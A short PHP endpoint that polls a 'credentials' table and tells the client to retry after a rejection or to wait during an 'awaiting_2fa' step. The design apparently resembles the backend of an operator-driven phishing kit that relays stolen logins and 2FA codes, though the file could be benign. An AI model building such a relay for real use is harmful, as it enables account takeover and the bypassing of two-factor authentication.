
<?php
require_once 'config.php';
header('Content-Type: application/json');

if (!isset($_SESSION['username'])) {
    echo json_encode(['error' => 'No active session']);
    exit;
}

$username = $_SESSION['username'];

// Query the database for the user's status
$stmt = $pdo->prepare("SELECT status FROM credentials WHERE username = ? ORDER BY id DESC LIMIT 1");
$stmt->execute([$username]);
$result = $stmt->fetch(PDO::FETCH_ASSOC);

$action = null;

if ($result) {
    if ($result['status'] === 'rejected') {
        $action = 'retry';
    } elseif ($result['status'] === 'awaiting_2fa') {
        $action = 'awaiting_2fa';
    }
}

echo json_encode(['action' => $action]);
?>
